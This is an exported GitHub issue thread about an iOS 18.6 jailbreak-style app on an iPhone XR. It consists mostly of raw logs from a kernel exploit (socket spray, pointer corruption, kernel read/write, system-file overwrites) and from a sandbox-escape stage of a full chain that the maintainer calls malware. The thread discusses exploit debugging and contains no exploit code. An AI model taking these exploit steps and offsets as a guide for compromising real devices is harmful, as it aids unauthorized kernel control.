# iphone xr 18.6

> **Repository:** [rooootdev/lara](https://github.com/rooootdev/lara)  
> **Issue:** [#2](https://github.com/rooootdev/lara/issues/2)  
> **State:** 🟣 closed (completed)  
> **Closed by:** [@rooootdev](https://github.com/rooootdev)  
> **Created:** Mar 27, 2026  
> **Updated:** Mar 28, 2026  
> **Closed:** Mar 28, 2026  

---

## Description

*Opened by [@dr1408](https://github.com/dr1408)* *on Mar 27, 2026*


PROC_PID_OFFSET: 0x60

downloading kernelcache to: /var/mobile/Containers/Data/Application/24B59BA6-913B-41EB-A904-9D028D761C65/Documents/kernelcache

libgrabkernel2: Found firmware URL: https://updates.cdn-apple.com/2025SummerFCS/fullrestores/082-99741/496569F8-D658-48C2-ABFB-B6DEBF18438D/iPhone11,8_18.6_22G86_Restore.ipsw (OTA: no)

libgrabkernel2: Downloading BuildManifest.plist...

libgrabkernel2: Downloading kernelcache.release.iphone11b to /var/mobile/Containers/Data/Application/24B59BA6-913B-41EB-A904-9D028D761C65/Documents/kernelcache...

libgrabkernel2: Downloaded kernelcache!

kernel base: 0xfffffff007004000

kernel entry: 0xfffffff007e10588

kernproc symbol: 0xfffffff007a52468

kernproc offset: 0xa4e468
starting darksword
device: iPhone11,8
running on non-a18 device
read_fd: 0x11
write_fd: 0x12
executable_name: lara
free_thread_arg: 0x103b7c000
physical_mapping_address: 0x1176dc000
pc_object: 0xae03
pc_address: 0x1690e8000
starting darksword
device: iPhone11,8
running on non-a18 device
read_fd: 0x11
write_fd: 0x12
executable_name: lara
free_thread_arg: 0x103b7c000
physical_mapping_address: 0x1176dc000
pc_object: 0xae03
pc_address: 0x1690e8000
spraying 22528 sockets...
spraying 22528 sockets...
socket_ports_count: 0x5800
start_pcb_id: 0x41ff8
end_pcb_id: 0x4cff6
looking in search mapping: 0
socket_ports_count: 0x5800
start_pcb_id: 0x41ff8
end_pcb_id: 0x4cff6
looking in search mapping: 0
pcb_start_offset: 0x0
target_inp_gencnt: 0x46638
inp_list_next_pointer: 0xffffffe03f048400
pcb_start_offset: 0x0
icmp6filter: 0xffffffe33c809f60
Corrupting icmp6filter pointer...
target_inp_gencnt: 0x46638
inp_list_next_pointer: 0xffffffe03f048400
icmp6filter: 0xffffffe33c809f60
Corrupting icmp6filter pointer...
target corrupted: 0xffffffe03f048548
found control_socket at idx: 0x2320
target corrupted: 0xffffffe03f048548
found control_socket at idx: 0x2320
highest_success_idx: 491
success_read_count: 112
highest_success_idx: 491
success_read_count: 112

kernel proc: 0xffffffe03d0afb68

looking for pid: 683

found our proc at 0xffffffe03b1fe490

pid: 683

name: lara

uid: 501

gid: 501
Walking kernel structures...
control_socket_pcb: 0xffffffe03f048000
pcbinfo_pointer: 0xfffffff01187fd90
ipi_zone: 0xfffffff00f027760
zv_name: 0xfffffff00e645325
searching for kernel Mach-O header...
kernel_base:  0xfffffff00e5d0000
kernel_slide: 0x75cc000
iOS 18: using so_count offset 0x254
kernel r/w is ready!
our_proc: 0xffffffe03b1fe490
our_task: 0xffffffe03b1febd0
exploit success!
kernel_base:  0xfffffff00e5d0000
kernel_slide: 0x75cc000

Walking kernel structures...
control_socket_pcb: 0xffffffe03f048000
pcbinfo_pointer: 0xfffffff01187fd90
ipi_zone: 0xfffffff00f027760
zv_name: 0xfffffff00e645325
searching for kernel Mach-O header...
kernel_base:  0xfffffff00e5d0000
kernel_slide: 0x75cc000
iOS 18: using so_count offset 0x254
kernel r/w is ready!
our_proc: 0xffffffe03b1fe490
our_task: 0xffffffe03b1febd0


exploit success!

kernel_base:  0xfffffff00e5d0000

kernel_slide: 0x75cc000


(kfs) kfs_init starting...

(kfs) Extracted heap PAC prefix: 0xffffff0000000000

(kfs) proc=0xffffffe03b1fe490 task=0xffffffe03b1febd0 (from exploit)

(kfs) file overwrite ready!

(kfs) our proc: 0xffffffe03b1fe490

kernel proc: 0xffffffe03d0afb68

looking for process: launchd

found process: launchd (PID: 1, UID: 0, GID: 0) at 0xffffffe03d0ad240

(kfs) launchd proc: 0xffffffe03d0ad240

(kfs) scanning launchd proc for p_textvp...

(kfs) check textvp=0xffffffe03d0afbf0 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03b2156d8 name_ptr=0xffffffdf56d59a60 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03cfbd580 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03bab0fd8 name_ptr=0x10010008315b (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe209ea0c80 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe209c44800 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffdf5633c230 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe123a9a000 name_ptr=0xffffffe209f00010 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffde7091be00 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffde70542d00 name_ptr=0xffffffdf54e9aa00 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe1236cc200 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03d0ad810 name_ptr=0x28 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03d0ad820 name_ptr=0x3c0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffdf562ecf00 name_ptr=0x10b (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03d908300 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03d114100 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffdf56921000 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03c4aa738 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03d0b02a8 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03cfbd0c0 name_ptr=0x3837b6123ab4b00 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03bab0a00 name_ptr=0x78e00ae12448a230 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffdf5687b700 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffdd3d113000 name_ptr=0x0 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe03d084200 name_ptr=0xedea234 (OV_NAME=0xb8)

(kfs) check textvp=0xffffffe1236a8090 name_ptr=0xf0aef2 (OV_NAME=0xb8)

(kfs) rootvnode not found via launchd (scanned proc+0x80 to proc+0x800)

(kfs) p_textvp offset may have changed on this iOS version

(kfs) rootvnode discovery failed; listdir will be unavailable

(kfs) kfs_init done
(kfs) kfs_init starting...
(kfs) Extracted heap PAC prefix: 0xffffff0000000000
(kfs) proc=0xffffffe03b1fe490 task=0xffffffe03b1febd0 (from exploit)
(kfs) file overwrite ready!
(kfs) our proc: 0xffffffe03b1fe490
(kfs) launchd proc: 0xffffffe03d0ad240
(kfs) scanning launchd proc for p_textvp...
(kfs) check textvp=0xffffffe03d0afbf0 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03b2156d8 name_ptr=0xffffffdf56d59a60 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03cfbd580 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03bab0fd8 name_ptr=0x10010008315b (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe209ea0c80 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe209c44800 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffdf5633c230 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe123a9a000 name_ptr=0xffffffe209f00010 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffde7091be00 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffde70542d00 name_ptr=0xffffffdf54e9aa00 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe1236cc200 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03d0ad810 name_ptr=0x28 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03d0ad820 name_ptr=0x3c0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffdf562ecf00 name_ptr=0x10b (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03d908300 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03d114100 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffdf56921000 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03c4aa738 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03d0b02a8 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03cfbd0c0 name_ptr=0x3837b6123ab4b00 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03bab0a00 name_ptr=0x78e00ae12448a230 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffdf5687b700 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffdd3d113000 name_ptr=0x0 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe03d084200 name_ptr=0xedea234 (OV_NAME=0xb8)
(kfs) check textvp=0xffffffe1236a8090 name_ptr=0xf0aef2 (OV_NAME=0xb8)
(kfs) rootvnode not found via launchd (scanned proc+0x80 to proc+0x800)
(kfs) p_textvp offset may have changed on this iOS version
(kfs) rootvnode discovery failed; listdir will be unavailable
(kfs) kfs_init done

kfs ready!


(kfs) overwrite: /System/Library/Fonts/Core/SFUI.ttf ← /private/var/containers/Bundle/Application/60507639-505F-4B47-AA0C-B6C0B8D9FC71/lara.app/Comic Sans SFUI.ttf

(kfs) target mmap'd at 0x1190d0000 (size 8342436)

(kfs) task (from exploit): 0xffffffe03b1febd0

(kfs) vm_map: 0xffffffde2365a200 (task+0x28)

0 : 33000000

8 : 420000

10 : ffffffdd3dd75df0

18 : ffffffdd3df91c60

20 : 102bbc000

28 : 358000000

30 : 1000e000001e5

38 : ffffffdd3d7b8ec0

40 : 6cc808f08a4b1e60

48 : 61d6f18000

50 : 7fffffffffffffff

58 : 7fffffffffffffff

60 : 7fffffffffffffff

68 : 0

70 : 1b

78 : 0

(kfs) vm_map entries: 485, looking for 0x1190d0000

(kfs) found entry 0xffffffdd3dd7e840: 0x1190d0000-0x1198c8000

(kfs) patching entry flags: 0x20020880 → 0x20021980

(kfs) writing 1174536 bytes...

(kfs) zeroed 7167900 bytes of trailing garbage

(kfs) overwrite done!
(kfs) using font: /private/var/containers/Bundle/Application/60507639-505F-4B47-AA0C-B6C0B8D9FC71/lara.app/Comic Sans SFUI.ttf
font changed to Comic Sans MS
(kfs) overwrite: /System/Library/Fonts/Core/SFUI.ttf ← /private/var/containers/Bundle/Application/60507639-505F-4B47-AA0C-B6C0B8D9FC71/lara.app/Comic Sans SFUI.ttf
(kfs) target mmap'd at 0x1190d0000 (size 8342436)
(kfs) task (from exploit): 0xffffffe03b1febd0
(kfs) vm_map: 0xffffffde2365a200 (tawsk+0x28)
(kfs) vm_map entries: 485, looking for 0x1190d0000
(kfs) found entry 0xffffffdd3dd7e840: 0x1190d0000-0x1198c8000
(kfs) patching entry flags: 0x20020880 → 0x20021980
(kfs) writing 1174536 bytes...
(kfs) zeroed 7167900 bytes of trailing garbage
(kfs) overwrite done!


I am new to ios .. the full chain dosent work for me I dunno why I am suspecting the gpu offsets I hope this project will give me opportunity to debug that thanks for you and badheli I tried contacting you at discord but maybe the link in readme is wrong


---

## Timeline (Verbose)

- Mar 28, 2026: 🔴 Closed by @rooootdev


---

## Comments (7)

### Comment #1 — [@rooootdev](https://github.com/rooootdev) · Mar 27, 2026

`ID: 4144815719`


Looks like everything is working successfully? What are you trying to do?


---

### Comment #2 — [@dr1408](https://github.com/dr1408) · Mar 27, 2026

`ID: 4144871324`


I am trying to make the full chain works for me but it dosent I enabled logging in sbx0 it show this

sbx0: runLoopHolder_tid: 0x103
sbx0: webProcess: 0x10e000100
sbx0: webPage: 0x1027541c8
sbx0: 	m_drawingArea: 0x10e009100
sbx0: 	m_isRenderingSuspended: 0x0
sbx0: -> remoteRenderingBackendProxy: 0x10c0fe250
sbx0: -> streamConnection: 0x10e014290
sbx0: -> connection: 0x10c02d6c0
sbx0: uiProcessConnection: 0x10c048340
sbx0: [+] SBX0() (retry: 0)
sbx0: crashGPUProcess("process cleanup")
sbx0: [-] going to respawn gpu process
sbx0: new gpuProcessConnection: 0x10c44c2a0
sbx0: waiting for sendPort
sbx0: received sendPort
sbx0: maybe_port: 0x5a13
sbx0: [+] SBX0() (retry: 1)
sbx0: backendConnection.identifier: 0xffffffff
sbx0: glConnection.identifier: 0x100000000
sbx0: RemoteRenderingBackend created
sbx0: RemoteGraphicsContextGL created
sbx0: Vertex shader created. ID:1
sbx0: Vertex shader sourced
sbx0: Vertex shader compiled
sbx0: Fragment shader created. ID:2
sbx0: Fragment shader sourced
sbx0: Fragment shader compiled
sbx0: Program has been created. ID:3
sbx0: Vertex shader has been attached
sbx0: Fragment shader has been attached
sbx0: Program has been linked
sbx0: Program enabled
sbx0: oob()
sbx0: [profiler] prepare_layout took 47ms
sbx0: FINISHED oob()
sbx0: preparePrimitives
sbx0: Cache font ID: 0x10000002e
sbx0: crashGPUProcess("leak size mismatch (expected: 8, actual: 0)")
sbx0: GPU crashed at CoreAnimation oob
sbx0: [-] going to respawn gpu process
sbx0: new gpuProcessConnection: 0x10c44c380
sbx0: waiting for sendPort
sbx0: received sendPort
sbx0: maybe_port: 0x5a1f
sbx0: [+] SBX0() (retry: 2)
sbx0: backendConnection.identifier: 0x100000030
sbx0: glConnection.identifier: 0x100000031
sbx0: RemoteRenderingBackend created
sbx0: RemoteGraphicsContextGL created
sbx0: Vertex shader created. ID:1
sbx0: Vertex shader sourced
sbx0: Vertex shader compiled
sbx0: Fragment shader created. ID:2
sbx0: Fragment shader sourced
sbx0: Fragment shader compiled
sbx0: Program has been created. ID:3
sbx0: Vertex shader has been attached
sbx0: Fragment shader has been attached
sbx0: Program has been linked
sbx0: Program enabled
sbx0: oob()
sbx0: [profiler] prepare_layout took 44ms
sbx0: FINISHED oob()
sbx0: preparePrimitives
sbx0: Cache font ID: 0x10000005f
sbx0: crashGPUProcess("leak size mismatch (expected: 8, actual: 0)")
sbx0: GPU crashed at CoreAnimation oob

so I am suspecting the gpu offsets in that file is wrong is there a way to debug this through this app?


---

### Comment #3 — [@rooootdev](https://github.com/rooootdev) · Mar 27, 2026

`ID: 4144945003`


What is this sbx0? Is this the full chain? Don’t run that on your phone it’s malware!


👍 2


---

### Comment #4 — [@dr1408](https://github.com/dr1408) · Mar 27, 2026

`ID: 4145027862`


It easy to run it locally just I removed the old c2 domains and yes I am trying to pentest it on my own device but facing some issues that's why I hope I can read the gpu memory through the app


---

### Comment #5 — [@rooootdev](https://github.com/rooootdev) · Mar 28, 2026

`ID: 4147852046`


Lara will at the moment not help with that.


---

### Comment #6 — [@dr1408](https://github.com/dr1408) · Mar 28, 2026

`ID: 4148831984`


New logs font changing worked fine 

--- session started: 2026-03-28 23:10:51 ---

PROC_PID_OFFSET: 0x60

downloading kernelcache to: /var/mobile/Containers/Data/Application/397EC625-9D56-4C61-A87F-8F33AE1ABE81/Documents/kernelcache

libgrabkernel2: Found firmware URL: https://updates.cdn-apple.com/2025SummerFCS/fullrestores/082-99741/496569F8-D658-48C2-ABFB-B6DEBF18438D/iPhone11,8_18.6_22G86_Restore.ipsw (OTA: no)

libgrabkernel2: Downloading BuildManifest.plist...

libgrabkernel2: Downloading kernelcache.release.iphone11b to /var/mobile/Containers/Data/Application/397EC625-9D56-4C61-A87F-8F33AE1ABE81/Documents/kernelcache...

libgrabkernel2: Downloaded kernelcache!

kernel base: 0xfffffff007004000

kernel entry: 0xfffffff007e10588

kernproc symbol: 0xfffffff007a52468

rootvnode symbol: 0xfffffff00a2b4300

kernproc offset: 0xa4e468

rootvnode offset: 0x32b0300

starting darksword
device: iPhone11,8
running on non-a18 device
read_fd: 0x12
write_fd: 0x13
executable_name: lara
free_thread_arg: 0x116a24000
physical_mapping_address: 0x117234000
pc_object: 0xab03
pc_address: 0x15148c000
starting darksword
device: iPhone11,8
running on non-a18 device
read_fd: 0x12
write_fd: 0x13
executable_name: lara
free_thread_arg: 0x116a24000
physical_mapping_address: 0x117234000
pc_object: 0xab03
pc_address: 0x15148c000
spraying 22528 sockets...
spraying 22528 sockets...
socket_ports_count: 0x5800
start_pcb_id: 0x16000
end_pcb_id: 0x20ffe
looking in search mapping: 0
socket_ports_count: 0x5800
start_pcb_id: 0x16000
end_pcb_id: 0x20ffe
looking in search mapping: 0
pcb_start_offset: 0x0
target_inp_gencnt: 0x1f11a
pcb_start_offset: 0x0
inp_list_next_pointer: 0xffffffdfe6a50400
icmp6filter: 0xffffffe0d04b0e80
Corrupting icmp6filter pointer...
target_inp_gencnt: 0x1f11a
inp_list_next_pointer: 0xffffffdfe6a50400
icmp6filter: 0xffffffe0d04b0e80
Corrupting icmp6filter pointer...
target corrupted: 0xffffffdfe6a50548
target corrupted: 0xffffffdfe6a50548
found control_socket at idx: 0x488d
found control_socket at idx: 0x488d
highest_success_idx: 491
success_read_count: 135
highest_success_idx: 491
Walking kernel structures...

kernel proc: 0xffffffdfe8c30920

looking for pid: 1747
control_socket_pcb: 0xffffffdfe6a50000
pcbinfo_pointer: 0xfffffff01d2ffd90
ipi_zone: 0xfffffff01aaa7760
zv_name: 0xfffffff01a0c5325

found proc: lara (pid=1747 uid=501 gid=501) @ 0xffffffdfe9b50488
searching for kernel Mach-O header from 0xfffffff01a0c4000...
candidate Mach-O at 0xfffffff01a058000: filetype=2 cpuinfo=0x2c0000002 (iter=27)
candidate Mach-O at 0xfffffff01a050000: filetype=12 cpuinfo=0xc00000002 (iter=29)
found MH_FILESET header at 0xfffffff01a050000
kernel_base:  0xfffffff01a050000
kernel_slide: 0x1304c000
iOS 18: using so_count offset 0x254
kernel r/w is ready!
success_read_count: 135
Walking kernel structures...
control_socket_pcb: 0xffffffdfe6a50000
pcbinfo_pointer: 0xfffffff01d2ffd90
our_proc: 0xffffffdfe9b50488
our_task: 0xffffffdfe9b50bc8
exploit success!
kernel_base:  0xfffffff01a050000
kernel_slide: 0x1304c000

ipi_zone: 0xfffffff01aaa7760
zv_name: 0xfffffff01a0c5325
searching for kernel Mach-O header from 0xfffffff01a0c4000...
candidate Mach-O at 0xfffffff01a058000: filetype=2 cpuinfo=0x2c0000002 (iter=27)
candidate Mach-O at 0xfffffff01a050000: filetype=12 cpuinfo=0xc00000002 (iter=29)
found MH_FILESET header at 0xfffffff01a050000
kernel_base:  0xfffffff01a050000
kernel_slide: 0x1304c000
iOS 18: using so_count offset 0x254
kernel r/w is ready!
our_proc: 0xffffffdfe9b50488
our_task: 0xffffffdfe9b50bc8


exploit success!

kernel_base:  0xfffffff01a050000

kernel_slide: 0x1304c000


(kfs) kfs_init starting...

(kfs) Extracted heap PAC prefix: 0xffffff0000000000

(kfs) proc=0xffffffdfe9b50488 task=0xffffffdfe9b50bc8 (from exploit)

(kfs) file overwrite ready!

(kfs) rootvnode offset probe: 0xffffffe0ceab7e00 (sym=0xfffffff01d300300)

(kfs) rootvnode via offset: 0xffffffe0ceab7e00

(kfs) ncache offsets mismatch

(kfs) ncache verification failed

(kfs) kfs_init done
(kfs) kfs_init starting...
(kfs) Extracted heap PAC prefix: 0xffffff0000000000
(kfs) proc=0xffffffdfe9b50488 task=0xffffffdfe9b50bc8 (from exploit)
(kfs) file overwrite ready!
(kfs) rootvnode offset probe: 0xffffffe0ceab7e00 (sym=0xfffffff01d300300)
(kfs) rootvnode via offset: 0xffffffe0ceab7e00
(kfs) ncache offsets mismatch
(kfs) ncache verification failed
(kfs) kfs_init done

kfs ready!


(kfs) overwrite: /System/Library/Fonts/Core/SFUI.ttf <- /private/var/containers/Bundle/Application/EB7F9059-1A82-462C-9D70-6DBEFE61EF5C/lara.app/DejaVuSansCondensed.ttf

(kfs) target mmap'd at 0x118f40000 (size 8342436)

(kfs) task (from exploit): 0xffffffdfe9b50bc8

(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=407)

(kfs) vm_map entries: 407, looking for 0x118f40000

(kfs) found entry 0xffffffdc0370c9a0: 0x118f40000-0x119738000

(kfs) patching entry flags: 0x20020880 -> 0x20021980

(kfs) writing 827348 bytes...

(kfs) zeroed 7515088 bytes of trailing garbage

(kfs) overwrite done!
(kfs) using font: /private/var/containers/Bundle/Application/EB7F9059-1A82-462C-9D70-6DBEFE61EF5C/lara.app/DejaVuSansCondensed.ttf
font changed to DejaVuSansCondensed
(kfs) overwrite: /System/Library/Fonts/Core/SFUI.ttf <- /private/var/containers/Bundle/Application/EB7F9059-1A82-462C-9D70-6DBEFE61EF5C/lara.app/DejaVuSansCondensed.ttf
(kfs) target mmap'd at 0x118f40000 (size 8342436)
(kfs) task (from exploit): 0xffffffdfe9b50bc8
(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=407)
(kfs) vm_map entries: 407, looking for 0x118f40000
(kfs) found entry 0xffffffdc0370c9a0: 0x118f40000-0x119738000
(kfs) patching entry flags: 0x20020880 -> 0x20021980
(kfs) writing 827348 bytes...
(kfs) zeroed 7515088 bytes of trailing garbage
(kfs) overwrite done!

(kfs) task (from exploit): 0xffffffdfe9b50bc8

(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=327)
(kfs) zeroed first page of /System/Library/PrivateFrameworks/CoreMaterial.framework/dockDark.materialrecipe

(kfs) vm_map entries: 327, looking for 0x10f688000

(kfs) found entry 0xffffffdc02ae0c20: 0x10f688000-0x10f68c000

(kfs) patching entry flags: 0x20020880 -> 0x20021980

(kfs) zeroed page containing offset 0x0 (page 0x0)

(kfs) task (from exploit): 0xffffffdfe9b50bc8

(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=327)

(kfs) vm_map entries: 327, looking for 0x10f688000

(kfs) found entry 0xffffffdc03dfe160: 0x10f688000-0x10f68c000

(kfs) patching entry flags: 0x20020880 -> 0x20021980

(kfs) zeroed page containing offset 0x0 (page 0x0)
(kfs) zeroed first page of /System/Library/PrivateFrameworks/CoreMaterial.framework/dockLight.materialrecipe
(kfs) task (from exploit): 0xffffffdfe9b50bc8
(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=327)
(kfs) vm_map entries: 327, looking for 0x10f688000
(kfs) found entry 0xffffffdc02ae0c20: 0x10f688000-0x10f68c000
(kfs) patching entry flags: 0x20020880 -> 0x20021980
(kfs) zeroed page containing offset 0x0 (page 0x0)
(kfs) task (from exploit): 0xffffffdfe9b50bc8
(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=327)
(kfs) vm_map entries: 327, looking for 0x10f688000
(kfs) found entry 0xffffffdc03dfe160: 0x10f688000-0x10f68c000
(kfs) patching entry flags: 0x20020880 -> 0x20021980
(kfs) zeroed page containing offset 0x0 (page 0x0)

(kfs) task (from exploit): 0xffffffdfe9b50bc8

(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=324)

(kfs) vm_map entries: 324, looking for 0x10f694000

(kfs) found entry 0xffffffdc031e2110: 0x10f694000-0x10f698000

(kfs) patching entry flags: 0x20020880 -> 0x20021980

(kfs) zeroed page containing offset 0x0 (page 0x0)

(kfs) task (from exploit): 0xffffffdfe9b50bc8

(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=324)

(kfs) vm_map entries: 324, looking for 0x10f694000
(kfs) zeroed first page of /System/Library/PrivateFrameworks/CoreMaterial.framework/dockDark.materialrecipe
(kfs) zeroed first page of /System/Library/PrivateFrameworks/CoreMaterial.framework/dockLight.materialrecipe

(kfs) found entry 0xffffffdc03ab7f10: 0x10f694000-0x10f698000

(kfs) patching entry flags: 0x20020880 -> 0x20021980

(kfs) zeroed page containing offset 0x0 (page 0x0)
(kfs) task (from exploit): 0xffffffdfe9b50bc8
(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=324)
(kfs) vm_map entries: 324, looking for 0x10f694000
(kfs) found entry 0xffffffdc031e2110: 0x10f694000-0x10f698000
(kfs) patching entry flags: 0x20020880 -> 0x20021980
(kfs) zeroed page containing offset 0x0 (page 0x0)
(kfs) task (from exploit): 0xffffffdfe9b50bc8
(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=324)
(kfs) vm_map entries: 324, looking for 0x10f694000
(kfs) found entry 0xffffffdc03ab7f10: 0x10f694000-0x10f698000
(kfs) patching entry flags: 0x20020880 -> 0x20021980
(kfs) zeroed page containing offset 0x0 (page 0x0)

kernel proc: 0xffffffdfe8c30920

looking for pid: 1747

found proc: lara (pid=1747 uid=501 gid=501) @ 0xffffffdfe9b50488

(kfs) overwrite: /System/Library/Fonts/Core/SFUI.ttf <- /private/var/containers/Bundle/Application/EB7F9059-1A82-462C-9D70-6DBEFE61EF5C/lara.app/Comic Sans MS.ttf

(kfs) target mmap'd at 0x111254000 (size 8342436)

(kfs) task (from exploit): 0xffffffdfe9b50bc8

(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=305)

(kfs) vm_map entries: 305, looking for 0x111254000

(kfs) found entry 0xffffffdc03c89c10: 0x111254000-0x111a4c000

(kfs) patching entry flags: 0x20020880 -> 0x20021980

(kfs) writing 312700 bytes...

(kfs) zeroed 8029736 bytes of trailing garbage

(kfs) overwrite done!
(kfs) using font: /private/var/containers/Bundle/Application/EB7F9059-1A82-462C-9D70-6DBEFE61EF5C/lara.app/Comic Sans MS.ttf
font changed to Comic Sans MS
(kfs) overwrite: /System/Library/Fonts/Core/SFUI.ttf <- /private/var/containers/Bundle/Application/EB7F9059-1A82-462C-9D70-6DBEFE61EF5C/lara.app/Comic Sans MS.ttf
(kfs) target mmap'd at 0x111254000 (size 8342436)
(kfs) task (from exploit): 0xffffffdfe9b50bc8
(kfs) vm_map: 0xffffffdce8abb790 (task+0x28, nentries=305)
(kfs) vm_map entries: 305, looking for 0x111254000
(kfs) found entry 0xffffffdc03c89c10: 0x111254000-0x111a4c000
(kfs) patching entry flags: 0x20020880 -> 0x20021980
(kfs) writing 312700 bytes...
(kfs) zeroed 8029736 bytes of trailing garbage
(kfs) overwrite done!


---

### Comment #7 — [@rooootdev](https://github.com/rooootdev) · Mar 28, 2026

`ID: 4148854316`


cool!


🎉 1


---

*Exported on 10/14/2026, 2:46:17 PM from [https://github.com/rooootdev/lara/issues/2](https://github.com/rooootdev/lara/issues/2)*
